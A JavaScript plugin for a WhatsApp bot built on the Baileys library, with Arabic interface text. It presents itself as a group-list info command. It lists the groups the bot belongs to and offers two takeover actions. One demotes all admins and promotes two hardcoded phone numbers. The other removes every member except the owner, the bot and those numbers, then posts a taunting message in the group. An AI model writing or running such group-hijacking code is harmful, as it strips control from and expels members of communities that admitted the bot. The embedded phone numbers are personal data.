import { prepareWAMessageMedia, generateWAMessageFromContent } from '@whiskeysockets/Baileys';

const img5 = 'https://files.catbox.moe/pb8qwe.jpg';

const GROUP_OWNER_ID = '967772350066@s.whatsapp.net';
const GROUP_DEVELOPERS = ['967773667218@s.whatsapp.net', '967772350066@s.whatsapp.net'];

const handler = async (m, { text, conn, participants, usedPrefix, command }) => {

let groupMetadata;
let groupParticipants;

  if (!text) {
    const groups = Object.entries(conn.chats).filter(([jid, chat]) => jid.endsWith('@g.us') && chat.isChats);
    const totalGroups = groups.length;

    const rows = await Promise.all(groups.map(async ([jid]) => {
       groupMetadata = (conn.chats[jid]?.metadata || await conn.groupMetadata(jid).catch(() => ({}))) || {};
       groupParticipants = groupMetadata.participants || [];
      const bot = groupParticipants.find((u) => conn.decodeJid(u.id) === conn.user.jid) || {};
      const isBotAdmin = bot?.admin || false;
      const totalParticipants = groupParticipants.length;

      return createGroupRows(conn, jid, isBotAdmin, totalParticipants, usedPrefix, command);
    }));

    const msg = await createInteractiveMessage(m, conn, totalGroups, rows, img5);
    await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    
  } else {
  
   if (text.startsWith('سحب') || text.startsWith('تصفيه') || text.startsWith('مغادرة')) {
   
    const [action, idgru] = text.split('-');

    
    
    try {
      groupMetadata = await conn.groupMetadata(idgru);
    } catch (e) {
      return conn.sendMessage(m.chat, { text: '⚠️ خطأ في جلب بيانات المجموعة.' }, { quoted: m });
    }

    const owner = groupMetadata.owner || [];
    groupParticipants = groupMetadata.participants || [];
    const botDevelopers = GROUP_DEVELOPERS;

    if (action === 'سحب') {
      const participantsToDemote = groupParticipants.filter(participant =>
        participant.admin &&
        participant.id !== owner &&
        participant.id !== conn.user.jid &&
        !botDevelopers.includes(participant.id)
      ).map(participant => participant.id);

      const developersToPromote = groupParticipants.filter(participant =>
        botDevelopers.includes(participant.id) &&
        !participant.admin
      ).map(participant => participant.id);

      if (participantsToDemote.length > 0) {
        await conn.groupParticipantsUpdate(idgru, participantsToDemote, 'demote');
      }

      if (developersToPromote.length > 0) {
        await conn.groupParticipantsUpdate(idgru, developersToPromote, 'promote');
      }

      const cap2 = `تسجيل سحب المجموعة بواسطه مطورى 😪👊🏻\nمطورى : @${m.sender.split('@')[0]} 💡❤️\nشكرا لاستضافتكم لي 🍿❤️\n\n> اطلب من مطورى ردها مجددا اذا كنت تريد 😉❤️.`;
      await conn.sendMessage(idgru, { text: cap2, mentions: [m.sender] }, { quoted: m });
      await conn.sendMessage(m.chat, { text: '*تم سحب المجموعة بنجاح ي مطورى 😉❤️*', mentions: [m.sender] }, { quoted: m });

    } else if (action === 'تصفيه') {
      const participantsToKick = groupParticipants.filter(participant =>
        participant.id !== owner &&
        participant.id !== conn.user.jid &&
        !botDevelopers.includes(participant.id)
      ).map(participant => participant.id);

      const developersToPromote = groupParticipants.filter(participant =>
        botDevelopers.includes(participant.id)
      ).map(participant => participant.id);

      await conn.groupParticipantsUpdate(idgru, participantsToKick, 'remove');
      await conn.groupParticipantsUpdate(idgru, developersToPromote, 'promote');

      const cap3 = `تسجيل تصفية المجموعة بواسطه مطورى 😪👊🏻\nمطورى : @${m.sender.split('@')[0]} 💡❤️\nشكرا لاستضافتكم لي 🍿❤️\n\n> اطلب من مطورى ردها مجددا اذا كنت تريد 😉❤️.`;
      await conn.sendMessage(idgru, { text: cap3, mentions: [m.sender] }, { quoted: m });
      await conn.sendMessage(m.chat, { text: '*تم تصفية المجموعة بنجاح ي مطورى 😉❤️*', mentions: [m.sender] }, { quoted: m });

    } else if (action === 'مغادرة') {
      const cap2 = `تسجيل خروجي بواسطه مطورى 😪👊🏻\nمطورى : @${m.sender.split('@')[0]} 💡❤️\nشكرا لاستضافتكم لي 🍿❤️\n\n> اطلب من مطورى اضافتي مجددا اذا كنت تريد 😉❤️.`;
      await conn.sendMessage(idgru, { text: cap2, mentions: [m.sender] }, { quoted: m });
      await conn.groupLeave(idgru);
      await conn.sendMessage(m.chat, { text: '*تمت العملية بنجاح ي مطورى 😉❤️*', mentions: [m.sender] }, { quoted: m });
    }

  } else {
  const gruid = text;
  try {
      groupMetadata = await conn.groupMetadata(gruid);
    } catch (e) {
      return conn.sendMessage(m.chat, { text: '⚠️ خطأ في جلب بيانات المجموعة.' }, { quoted: m });
    }
    
    const groupName = await conn.getName(gruid);
    let groupIcon;
    try {
        groupIcon = await conn.profilePictureUrl(gruid, 'image');
    } catch (e) {
        groupIcon = 'https://files.catbox.moe/pb8qwe.jpg';
    }
    
    await conn.sendButton(m.chat, groupName, wm, groupIcon, [['سحب', `${usedPrefix + command} سحب-${gruid}`], ['تصفيه', `${usedPrefix + command} تصفيه-${gruid}`], ['مغادرة', `${usedPrefix + command} مغادرة-${gruid}`]], null, null, m);
    
  }
  
  }
};

handler.help = ['groups', 'grouplist'];
handler.tags = ['info'];
handler.command = ['المجموعات', 'مجموعات'];
handler.rowner = true;

export default handler;

const createGroupRows = async (conn, jid, isBotAdmin, totalParticipants, usedPrefix, command) => {
  const groupName = await conn.getName(jid);
  return {
    header: `مجموعة: ${groupName}`,
    title: `البوت ادمن: ${isBotAdmin ? 'نعم' : 'لا'} - المشاركين: ${totalParticipants}`,
    description: 'قائمة خيارات المجموعة',
    id: `${usedPrefix + command} ${jid}`
  };
};

const createInteractiveMessage = async (m, conn, totalGroups, rows, imgUrl) => {
  const mediaMessage = await prepareWAMessageMedia({ image: { url: imgUrl } }, { upload: conn.waUploadToServer });
  const caption = `قائمة المجموعات المشارك بها البوت\nالعدد: ${totalGroups}`;

  return generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: caption },
          footer: { text: wm },
          header: {
            hasMediaAttachment: true,
            imageMessage: mediaMessage.imageMessage
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: 'single_select',
                buttonParamsJson: JSON.stringify({
                  title: 'قــائــمــة المجـموعـات',
                  sections: [
                    {
                      title: '「 المجـموعـات 」',
                      highlight_label: '🗃️',
                      rows: rows
                    }
                  ]
                })
              }
            ]
          }
        }
      }
    }
  }, { userJid: conn.user.jid, quoted: m });
};